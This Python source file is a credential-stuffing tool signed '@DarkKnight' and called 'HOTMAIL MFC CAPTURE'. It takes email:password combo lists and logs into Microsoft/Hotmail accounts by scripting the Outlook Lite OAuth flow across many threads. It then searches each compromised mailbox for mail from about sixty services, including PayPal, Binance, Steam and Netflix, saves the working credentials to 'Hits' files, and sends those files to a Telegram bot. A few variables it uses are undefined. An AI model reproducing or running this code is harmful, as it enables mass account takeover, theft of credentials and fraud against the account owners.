import os, sys, io, time, json, uuid, pycountry
import datetime, requests, threading, concurrent.futures
from colorama import Fore, Style, init
import random
import re
from threading import Lock, Semaphore
from pathlib import Path

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
init(autoreset=True)

# Configuration
MY_SIGNATURE = "@DarkKnight"
DISCORD_CHANNEL = "https://discord.gg/pJYkaUDYqM"
DISCORD_INVITE = "https://discord.gg/pJYkaUDYqM"

# Global counters and locks
lock = threading.Lock()
hit = 0
bad = 0
retry = 0
total_combos = 0
processed = 0
service_hits = {}  # Dictionary to track hits per service
checked_accounts = set()
rate_limit_semaphore = Semaphore(500)

# Banner
def print_banner():
    banner = f"""
{Fore.CYAN}    __  ______  __________  ___  _____    ____ 
{Fore.CYAN}   / / / / __ \/_  __/  |/  / / / /   |  / / / 
{Fore.CYAN}  / /_/ / / / / / / / /|_/ / /_/ / /| | / / /  
{Fore.CYAN} / __  / /_/ / / / / /  / / __  / ___ |/ / /___
{Fore.CYAN}/_/ /_/\____/ /_/ /_/  /_/_/ /_/_/  |_/_/_____/
{Fore.WHITE}--------------------------------------------------
{Fore.YELLOW}          DEVELOPED BY : {Fore.MAGENTA}{MY_SIGNATURE}
{Fore.YELLOW}          TOOL :{Fore.RED} HOTMAIL MFC CAPTURE
{Fore.WHITE}--------------------------------------------------
    """
    print(banner)

def print_footer():
    footer = f"""
{Fore.WHITE}--------------------------------------------------
{Fore.CYAN}Developer : {Fore.MAGENTA}{MY_SIGNATURE}
{Fore.WHITE}--------------------------------------------------
"""
    print(footer)

# Menu
menu = f"""
{Fore.WHITE}
┌──────────────────────────────────────────────┐
│                                              │
│   {Fore.WHITE}CHECK MODE SELECTION{Fore.WHITE}                       │
│                                              │
│   {Fore.LIGHTBLACK_EX}Select a scan mode to continue{Fore.WHITE}             │
│                                              │
│   {Fore.CYAN}1{Fore.WHITE} - All Services {Fore.LIGHTBLACK_EX}(Check Everything){Fore.WHITE}        │
│   {Fore.CYAN}2{Fore.WHITE} - Specific Service {Fore.LIGHTBLACK_EX}(Choose One){Fore.WHITE}          │
│                                              │
└──────────────────────────────────────────────┘

{Fore.WHITE}"""

class TelegramBot:
    """Telegram Bot for sending files and messages"""
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"
    
    def send_message(self, text):
        """Send text message"""
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=data, timeout=30)
            return response.status_code == 200
        except Exception as e:
            print(f"{Fore.RED}✗ Telegram message error: {e}{Style.RESET_ALL}")
            return False
    
    def send_video(self, video_url, caption=""):
        """Send video from URL"""
        try:
            url = f"{self.base_url}/sendVideo"
            data = {
                'chat_id': self.chat_id,
                'video': video_url,
                'caption': caption,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=data, timeout=60)
            return response.status_code == 200
        except Exception as e:
            print(f"{Fore.RED}✗ Telegram video error: {e}{Style.RESET_ALL}")
            return False
    
    def send_document(self, file_path, caption=""):
        """Send document/file"""
        try:
            if not os.path.exists(file_path):
                return False
            
            url = f"{self.base_url}/sendDocument"
            
            with open(file_path, 'rb') as file:
                files = {'document': file}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption
                }
                response = requests.post(url, files=files, data=data, timeout=60)
            
            return response.status_code == 200
        except Exception as e:
            print(f"{Fore.RED}✗ Telegram file error: {e}{Style.RESET_ALL}")
            return False

# Service definitions with categories
services = {
    # Social Media
    "Facebook": {"sender": "security@facebookmail.com", "file": "Hits_Facebook_by_@DarkKnight.txt", "category": "social"},
    "Instagram": {"sender": "security@mail.instagram.com", "file": "Hits_Instagram_by_@DarkKnight.txt", "category": "social"},
    "TikTok": {"sender": "register@account.tiktok.com", "file": "Hits_TikTok_by_@DarkKnight.txt", "category": "social"},
    "Twitter": {"sender": "info@x.com", "file": "Hits_Twitter_by_@DarkKnight.txt", "category": "social"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "Hits_LinkedIn_by_@DarkKnight.txt", "category": "social"},
    "Pinterest": {"sender": "no-reply@pinterest.com", "file": "Hits_Pinterest_by_@DarkKnight.txt", "category": "social"},
    "Reddit": {"sender": "noreply@reddit.com", "file": "Hits_Reddit_by_@DarkKnight.txt", "category": "social"},
    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "Hits_Snapchat_by_@DarkKnight.txt", "category": "social"},
    "VK": {"sender": "noreply@vk.com", "file": "Hits_VK_by_@DarkKnight.txt", "category": "social"},
    "WeChat": {"sender": "no-reply@wechat.com", "file": "Hits_WeChat_by_@DarkKnight.txt", "category": "social"},
    
    # Messaging
    "WhatsApp": {"sender": "no-reply@whatsapp.com", "file": "Hits_WhatsApp_by_@DarkKnight.txt", "category": "messaging"},
    "Telegram": {"sender": "telegram.org", "file": "Hits_Telegram_by_@DarkKnight.txt", "category": "messaging"},
    "Discord": {"sender": "noreply@discord.com", "file": "Hits_Discord_by_@DarkKnight.txt", "category": "messaging"},
    "Signal": {"sender": "no-reply@signal.org", "file": "Hits_Signal_by_@DarkKnight.txt", "category": "messaging"},
    "Line": {"sender": "no-reply@line.me", "file": "Hits_Line_by_@DarkKnight.txt", "category": "messaging"},
    
    # Streaming & Entertainment
    "Netflix": {"sender": "info@account.netflix.com", "file": "Hits_Netflix_by_@DarkKnight.txt", "category": "streaming"},
    "Spotify": {"sender": "no-reply@spotify.com", "file": "Hits_Spotify_by_@DarkKnight.txt", "category": "streaming"},
    "Twitch": {"sender": "no-reply@twitch.tv", "file": "Hits_Twitch_by_@DarkKnight.txt", "category": "streaming"},
    "YouTube": {"sender": "no-reply@youtube.com", "file": "Hits_YouTube_by_@DarkKnight.txt", "category": "streaming"},
    "Disney+": {"sender": "no-reply@disneyplus.com", "file": "Hits_DisneyPlus_by_@DarkKnight.txt", "category": "streaming"},
    "Hulu": {"sender": "account@hulu.com", "file": "Hits_Hulu_by_@DarkKnight.txt", "category": "streaming"},
    "HBO Max": {"sender": "no-reply@hbomax.com", "file": "Hits_HBOMax_by_@DarkKnight.txt", "category": "streaming"},
    "Amazon Prime": {"sender": "auto-confirm@amazon.com", "file": "Hits_AmazonPrime_by_@DarkKnight.txt", "category": "streaming"},
    "Apple TV+": {"sender": "no-reply@apple.com", "file": "Hits_AppleTV_by_@DarkKnight.txt", "category": "streaming"},
    "Crunchyroll": {"sender": "noreply@crunchyroll.com", "file": "Hits_Crunchyroll_by_@DarkKnight.txt", "category": "streaming"},
    
    # E-commerce & Shopping
    "Amazon": {"sender": "auto-confirm@amazon.com", "file": "Hits_Amazon_by_@DarkKnight.txt", "category": "shopping"},
    "eBay": {"sender": "newuser@nuwelcome.ebay.com", "file": "Hits_eBay_by_@DarkKnight.txt", "category": "shopping"},
    "Shopify": {"sender": "no-reply@shopify.com", "file": "Hits_Shopify_by_@DarkKnight.txt", "category": "shopping"},
    "Etsy": {"sender": "transaction@etsy.com", "file": "Hits_Etsy_by_@DarkKnight.txt", "category": "shopping"},
    "AliExpress": {"sender": "no-reply@aliexpress.com", "file": "Hits_AliExpress_by_@DarkKnight.txt", "category": "shopping"},
    "Walmart": {"sender": "no-reply@walmart.com", "file": "Hits_Walmart_by_@DarkKnight.txt", "category": "shopping"},
    
    # Payment & Finance
    "PayPal": {"sender": "service@paypal.com.br", "file": "Hits_PayPal_by_@DarkKnight.txt", "category": "finance"},
    "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "Hits_Binance_by_@DarkKnight.txt", "category": "finance"},
    "Coinbase": {"sender": "no-reply@coinbase.com", "file": "Hits_Coinbase_by_@DarkKnight.txt", "category": "finance"},
    "Revolut": {"sender": "no-reply@revolut.com", "file": "Hits_Revolut_by_@DarkKnight.txt", "category": "finance"},
    "Venmo": {"sender": "no-reply@venmo.com", "file": "Hits_Venmo_by_@DarkKnight.txt", "category": "finance"},
    "Cash App": {"sender": "no-reply@cash.app", "file": "Hits_CashApp_by_@DarkKnight.txt", "category": "finance"},
    
    # Gaming Platforms
    "Steam": {"sender": "noreply@steampowered.com", "file": "Hits_Steam_by_@DarkKnight.txt", "category": "gaming"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "Hits_Xbox_by_@DarkKnight.txt", "category": "gaming"},
    "PlayStation": {"sender": "reply@txn-email.playstation.com", "file": "Hits_PlayStation_by_@DarkKnight.txt", "category": "gaming"},
    "Epic Games": {"sender": "help@acct.epicgames.com", "file": "Hits_EpicGames_by_@DarkKnight.txt", "category": "gaming"},
    "EA Sports": {"sender": "EA@e.ea.com", "file": "Hits_EASports_by_@DarkKnight.txt", "category": "gaming"},
    "Ubisoft": {"sender": "noreply@ubisoft.com", "file": "Hits_Ubisoft_by_@DarkKnight.txt", "category": "gaming"},
    "Riot Games": {"sender": "no-reply@riotgames.com", "file": "Hits_RiotGames_by_@DarkKnight.txt", "category": "gaming"},
    "Valorant": {"sender": "noreply@valorant.com", "file": "Hits_Valorant_by_@DarkKnight.txt", "category": "gaming"},
    "Roblox": {"sender": "accounts@roblox.com", "file": "Hits_Roblox_by_@DarkKnight.txt", "category": "gaming"},
    "Minecraft": {"sender": "noreply@mojang.com", "file": "Hits_Minecraft_by_@DarkKnight.txt", "category": "gaming"},
    "Fortnite": {"sender": "noreply@epicgames.com", "file": "Hits_Fortnite_by_@DarkKnight.txt", "category": "gaming"},
    
    # Tech & Productivity
    "Google": {"sender": "no-reply@accounts.google.com", "file": "Hits_Google_by_@DarkKnight.txt", "category": "tech"},
    "Microsoft": {"sender": "account-security-noreply@accountprotection.microsoft.com", "file": "Hits_Microsoft_by_@DarkKnight.txt", "category": "tech"},
    "Apple": {"sender": "no-reply@apple.com", "file": "Hits_Apple_by_@DarkKnight.txt", "category": "tech"},
    "GitHub": {"sender": "noreply@github.com", "file": "Hits_GitHub_by_@DarkKnight.txt", "category": "tech"},
    "Dropbox": {"sender": "no-reply@dropbox.com", "file": "Hits_Dropbox_by_@DarkKnight.txt", "category": "tech"},
    "Zoom": {"sender": "no-reply@zoom.us", "file": "Hits_Zoom_by_@DarkKnight.txt", "category": "tech"},
    "Slack": {"sender": "no-reply@slack.com", "file": "Hits_Slack_by_@DarkKnight.txt", "category": "tech"},
    
    # VPN & Security
    "NordVPN": {"sender": "no-reply@nordvpn.com", "file": "Hits_NordVPN_by_@DarkKnight.txt", "category": "security"},
    "ExpressVPN": {"sender": "no-reply@expressvpn.com", "file": "Hits_ExpressVPN_by_@DarkKnight.txt", "category": "security"},
    
    # Travel & Transportation
    "Airbnb": {"sender": "no-reply@airbnb.com", "file": "Hits_Airbnb_by_@DarkKnight.txt", "category": "travel"},
    "Uber": {"sender": "no-reply@uber.com", "file": "Hits_Uber_by_@DarkKnight.txt", "category": "travel"},
    "Booking.com": {"sender": "no-reply@booking.com", "file": "Hits_Booking_by_@DarkKnight.txt", "category": "travel"},
    
    # Food Delivery
    "Uber Eats": {"sender": "no-reply@ubereats.com", "file": "Hits_UberEats_by_@DarkKnight.txt", "category": "food"},
    "DoorDash": {"sender": "no-reply@doordash.com", "file": "Hits_DoorDash_by_@DarkKnight.txt", "category": "food"},
}

def show_service_menu():
    """Display categorized service selection menu"""
    categories = {
        "social": "📱 SOCIAL MEDIA",
        "messaging": "💬 MESSAGING",
        "streaming": "📺 STREAMING",
        "shopping": "🛒 SHOPPING",
        "finance": "💰 FINANCE & CRYPTO",
        "gaming": "🎮 GAMING",
        "tech": "💻 TECH & PRODUCTIVITY",
        "security": "🔒 SECURITY & VPN",
        "travel": "✈️ TRAVEL",
        "food": "🍔 FOOD DELIVERY"
    }
    
    # Group services by category
    categorized = {}
    for service_name, service_info in services.items():
        cat = service_info.get("category", "other")
        if cat not in categorized:
            categorized[cat] = []
        categorized[cat].append(service_name)
    
    print(f"\n{Fore.WHITE}┌{'─' * 50}┐{Style.RESET_ALL}")
    print(f"{Fore.WHITE}│{Fore.YELLOW} {'SELECT SERVICE TO CHECK':^48} {Fore.WHITE}│{Style.RESET_ALL}")
    print(f"{Fore.WHITE}├{'─' * 50}┤{Style.RESET_ALL}")
    
    counter = 1
    service_map = {}
    
    for cat_key in ["social", "messaging", "streaming", "shopping", "finance", "gaming", "tech", "security", "travel", "food"]:
        if cat_key in categorized:
            print(f"{Fore.WHITE}│                                                  │{Style.RESET_ALL}")
            print(f"{Fore.WHITE}│ {Fore.CYAN}{categories[cat_key]:<48}{Fore.WHITE} │{Style.RESET_ALL}")
            for service in sorted(categorized[cat_key]):
                service_map[counter] = service
                print(f"{Fore.WHITE}│ {Fore.GREEN}{counter:>3}{Fore.WHITE} - {service:<42} │{Style.RESET_ALL}")
                counter += 1
    
    print(f"{Fore.WHITE}└{'─' * 50}┘{Style.RESET_ALL}\n")
    
    while True:
        try:
            choice = int(input(f"{Fore.CYAN}└─ Enter service number (1-{counter-1}): {Style.RESET_ALL}").strip())
            if choice in service_map:
                return service_map[choice]
            else:
                print(f"{Fore.RED}✗ Invalid choice!{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}✗ Please enter a number!{Style.RESET_ALL}")

def get_capture(email, password, access_token, cid, selected_service=None):
    """Search for linked accounts in email"""
    global service_hits
    
    try:
        search_url = "https://outlook.live.com/search/api/v2/query"
        
        services_to_check = {selected_service: services[selected_service]} if selected_service else services
        
        for service_name, service_info in services_to_check.items():
            sender = service_info["sender"]
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": f"from:{sender}"},
                    "Size": 1,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            try:
                r = requests.post(search_url, json=payload, headers=headers, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if 'EntitySets' in data and len(data['EntitySets']) > 0:
                        entity_set = data['EntitySets'][0]
                        if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                            result_set = entity_set['ResultSets'][0]
                            total = result_set.get('Total', 0)
                            if total > 0:
                                # Service found! Save to file
                                output_dir = "Accounts"
                                if not os.path.exists(output_dir):
                                    os.makedirs(output_dir)
                                
                                file_path = os.path.join(output_dir, service_info["file"])
                                
                                # Create file with header if it doesn't exist
                                if not os.path.exists(file_path):
                                    with open(file_path, 'w', encoding='utf-8') as f:
                                        f.write(f"# Created by {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")
                                
                                # Append account
                                with open(file_path, 'a', encoding='utf-8') as f:
                                    f.write(f"{email}:{password}\n")
                                
                                # Update counter
                                with lock:
                                    if service_name not in service_hits:
                                        service_hits[service_name] = 0
                                    service_hits[service_name] += 1
                
                time.sleep(0.1)  # Small delay between searches
            except:
                continue
                
    except Exception as e:
        pass

def check_account(email, password, selected_service=None):
    """Check hotmail account"""
    try:
        session = requests.Session()
        
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        headers1 = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": str(uuid.uuid4()),
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        
        r1 = session.get(url1, headers=headers1, timeout=15)
        
        if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
            return {"status": "BAD"}
        if "MSAccount" not in r1.text:
            return {"status": "BAD"}
        
        time.sleep(0.3)
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        
        r2 = session.get(url2, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }, allow_redirects=True, timeout=15)
        
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        
        if not url_match or not ppft_match:
            return {"status": "BAD"}
        
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        
        r3 = session.post(post_url, data=login_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }, allow_redirects=False, timeout=15)
        
        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
            return {"status": "BAD"}
        
        if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
            return {"status": "BAD"}
            
        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "BAD"}
        
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "BAD"}
        
        code = code_match.group(1)
        
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        
        if r4.status_code != 200 or "access_token" not in r4.text:
            return {"status": "BAD"}
        
        token_json = r4.json()
        access_token = token_json["access_token"]
        
        mspcid = None
        for cookie in session.cookies:
            if cookie.name == "MSPCID":
                mspcid = cookie.value
                break
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        
        get_capture(email, password, access_token, cid, selected_service)
        return {"status": "HIT"}
        
    except requests.exceptions.Timeout:
        return {"status": "RETRY"}
    except Exception as e:
        return {"status": "RETRY"}

def update_live_table(current_email, check_mode):
    """Display live statistics table"""
    global hit, bad, retry, processed, total_combos, service_hits
    
    with lock:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_banner()
        
        progress_percent = min((processed / total_combos * 100), 100) if total_combos > 0 else 0
        
        print(f"{Fore.WHITE}┌{'─' * 51}┐{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ {Fore.YELLOW}Status checking...{' ' * 31}{Style.RESET_ALL} │")
        print(f"{Fore.WHITE}├{'─' * 51}┤{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ {Fore.GREEN}✓ True {Fore.WHITE} │ {Fore.GREEN}{hit:<40}{Fore.WHITE}│{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ {Fore.RED}✗ Bad  {Fore.WHITE} │ {Fore.RED}{bad:<40}{Fore.WHITE}│{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ {Fore.YELLOW}🔄Retry {Fore.WHITE}│{Fore.YELLOW} {retry:<40}{Fore.WHITE}│{Style.RESET_ALL}")
        print(f"{Fore.WHITE}├{'─' * 51}┤{Style.RESET_ALL}")
        
        # Show only services that have hits
        if service_hits:
            for service_name, count in sorted(service_hits.items(), key=lambda x: x[1], reverse=True):
                service_display = service_name[:12].ljust(12)
                print(f"{Fore.WHITE}│ {Fore.CYAN}{service_display}{Fore.WHITE}│ {Fore.CYAN}{count:<40}{Fore.WHITE}│{Style.RESET_ALL}")
            print(f"{Fore.WHITE}├{'─' * 51}┤{Style.RESET_ALL}")
        else:
            print(f"{Fore.WHITE}│ {Fore.LIGHTBLACK_EX}(no services found yet){' ' * 27}{Fore.WHITE}│{Style.RESET_ALL}")
            print(f"{Fore.WHITE}├{'─' * 51}┤{Style.RESET_ALL}")
        
        print(f"{Fore.WHITE}│ {Fore.CYAN}Progress: {progress_percent:.1f}% | {processed}/{total_combos}{' ' * (50 - len(f'Progress: {progress_percent:.1f}% | {processed}/{total_combos}') - 2)}{Style.RESET_ALL}  │")
        print(f"{Fore.WHITE}├{'─' * 51}┤{Style.RESET_ALL}")
        
        email_display = current_email[:46] if len(current_email) > 46 else current_email
        padding = 48 - len(email_display)
        print(f"{Fore.WHITE}│ {Fore.YELLOW}Checking: {Fore.WHITE}{email_display}{' ' *29}│{Style.RESET_ALL}")
        print(f"{Fore.WHITE}└{'─' * 51}┘{Style.RESET_ALL}")

def check_combo(email, password, selected_service=None):
    global hit, bad, retry, processed
    
    account_id = f"{email}:{password}"
    if account_id in checked_accounts:
        with lock:
            processed += 1
        update_live_table(email, selected_service or "all")
        return
        
    checked_accounts.add(account_id)
    
    with rate_limit_semaphore:
        time.sleep(random.uniform(0.01, 0.05))
        
        result = check_account(email, password, selected_service)
        
        with lock:
            if result["status"] == "HIT":
                hit += 1
            elif result["status"] == "BAD":
                bad += 1
            elif result["status"] == "RETRY":
                retry += 1
            else:
                bad += 1
            
            processed += 1
        
        update_live_table(email, selected_service or "all")

def main():
    global total_combos, processed
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    
    # Get Telegram credentials
    print(f"\n{Fore.CYAN}╔══════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.YELLOW}  TELEGRAM BOT CONFIGURATION          {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚══════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    telegram_token = input(f"{Fore.CYAN}└─ Enter Telegram Bot Token: {Style.RESET_ALL}").strip()
    telegram_chat_id = input(f"{Fore.CYAN}└─ Enter Telegram Chat ID: {Style.RESET_ALL}").strip()
    
    telegram_bot = None
    if telegram_token and telegram_chat_id:
        telegram_bot = TelegramBot(telegram_token, telegram_chat_id)
        print(f"\n{Fore.GREEN}✓ Telegram Bot configured{Style.RESET_ALL}")
        
        # Send welcome video
        print(f"{Fore.CYAN}📹 Sending welcome video...{Style.RESET_ALL}")
        welcome_caption = f"""🎯 <b>Welcome to HOTMAIL MFC CAPTURE!</b>

This script checks Hotmail accounts and finds:
✅ 100+ linked services
✅ Social Media accounts
✅ Streaming services
✅ Gaming platforms
✅ Finance & Crypto
✅ And much more!

📤 <b>Results will be sent here automatically!</b>

💎 Created by {MY_SIGNATURE}
🔗 Channel: {TELEGRAM_CHANNEL}
"""
        if telegram_bot.send_video(WELCOME_VIDEO_URL, welcome_caption):
            print(f"{Fore.GREEN}✓ Welcome video sent!{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠ Could not send video{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.YELLOW}⚠ Telegram Bot skipped{Style.RESET_ALL}")
    
    # Show menu
    print(menu)
    mode_choice = input(f"{Fore.CYAN}└─ Select mode (1-2): {Style.RESET_ALL}").strip()
    
    selected_service = None
    if mode_choice == "2":
        selected_service = show_service_menu()
        print(f"\n{Fore.GREEN}✓ Selected: {selected_service}{Style.RESET_ALL}")
    
    # Get combo file
    file_path = input(f"\n{Fore.CYAN}└─ Combo file path: {Style.RESET_ALL}").strip()
    
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if ":" in line]
        total_combos = len(lines)
    except FileNotFoundError:
        print(f"{Fore.RED}✗ File not found: {file_path}{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}✗ Error reading file: {e}{Style.RESET_ALL}")
        sys.exit(1)
    
    # Get threads
    while True:
        try:
            num_threads = int(input(f"{Fore.CYAN}└─ Threads (20-200 recommended): {Style.RESET_ALL}"))
            if 1 <= num_threads <= 1000:
                break
            else:
                print(f"{Fore.RED}✗ Please enter between 1-1000{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}✗ Please enter a valid number{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}[*] Total combos: {total_combos}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Starting check with {num_threads} threads...{Style.RESET_ALL}")
    time.sleep(2)
    
    # Start checking
    update_live_table("Starting...", selected_service or "all")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for line in lines:
            if ":" in line:
                parts = line.split(":", 1)
                email = parts[0].strip()
                password = parts[1].strip()
                futures.append(executor.submit(check_combo, email, password, selected_service))
        
        concurrent.futures.wait(futures)
    
    # Final results
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    
    print(f"\n{Fore.CYAN}╔{'═' * 68}╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.YELLOW} {'📊 FINAL RESULTS':^66} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╠{'═' * 68}╣{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}✓ Hits:{Style.RESET_ALL}            {Fore.GREEN}{hit:>48}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.RED}✗ Bad:{Style.RESET_ALL}             {Fore.RED}{bad:>48}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}🔄 Retry:{Style.RESET_ALL}          {Fore.YELLOW}{retry:>48}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}")
    
    if service_hits:
        print(f"{Fore.CYAN}╠{'═' * 68}╣{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.MAGENTA}Services Found:{Style.RESET_ALL}{' ' * 53}{Fore.CYAN}║{Style.RESET_ALL}")
        for service_name, count in sorted(service_hits.items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.CYAN}{service_name:<20}{Style.RESET_ALL} {Fore.WHITE}|{Style.RESET_ALL} {Fore.CYAN}{count:>44}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}╚{'═' * 68}╝{Style.RESET_ALL}\n")
    
    # Send results to Telegram
    if telegram_bot and hit > 0:
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}  SENDING TO TELEGRAM                {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        # Send summary
        summary = f"""
<b>✅ Scan Completed</b>

<b>📊 Results:</b>
• Hits: {hit}
• Bad: {bad}
• Retry: {retry}

<b>🔍 Services Found: {len(service_hits)}</b>

<b>💎 Created by {MY_SIGNATURE}</b>
<b>🔗 Channel: {TELEGRAM_CHANNEL}</b>
"""
        telegram_bot.send_message(summary)
        
        # Send files (only files with hits)
        output_dir = "Accounts"
        caption = f"Created by {MY_SIGNATURE} {TELEGRAM_CHANNEL}"
        
        for service_name in service_hits.keys():
            file_path = os.path.join(output_dir, services[service_name]["file"])
            if os.path.exists(file_path):
                file_name = os.path.basename(file_path)
                print(f"{Fore.CYAN}📤 Sending: {Fore.WHITE}{file_name}{Style.RESET_ALL}")
                
                if telegram_bot.send_document(file_path, caption):
                    print(f"{Fore.GREEN}✓ Sent successfully{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}✗ Failed to send{Style.RESET_ALL}")
                
                time.sleep(1)
        
        print(f"\n{Fore.GREEN}✓ All files sent to Telegram!{Style.RESET_ALL}")
    
    print_footer()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⚠ Scan interrupted by user{Style.RESET_ALL}")
        print_footer()
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}✗ Fatal error: {e}{Style.RESET_ALL}")
        print_footer()
        sys.exit(1)
